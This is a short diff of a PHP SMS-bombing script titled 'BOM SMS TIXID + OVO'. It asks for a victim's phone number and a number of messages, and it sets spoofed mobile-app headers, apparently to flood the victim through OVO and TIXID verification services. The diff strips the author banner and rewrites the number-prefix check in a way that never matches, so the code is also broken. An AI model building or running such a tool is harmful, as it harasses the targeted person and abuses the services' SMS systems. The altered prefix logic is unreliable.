@@ -19,16 +19,16 @@ $ovo[] = 'OS: Android';
 $ovo[] = 'User-Agent: okhttp/3.11.0';
 
 // EKSE
-echo "===================\n";
-echo "BOM SMS TIXID + OVO\n";
-echo "   By Gidhan B.A\n";
-echo "===================\n";
+
+
+
+
 echo "Nomer HP Korban: ";
 $number = trim(fgets(STDIN));
 $numbers2 = $number;
 $numbers = $number[0].$number[1];
-if($numbers == "08") { 
-	$number = str_replace("08","+628",$number);
+if($numbers == "628") { 
+	$number = str_replace("628","08",$number);
 }
 echo "Jumlah SMS: ";
 $qty = trim(fgets(STDIN));
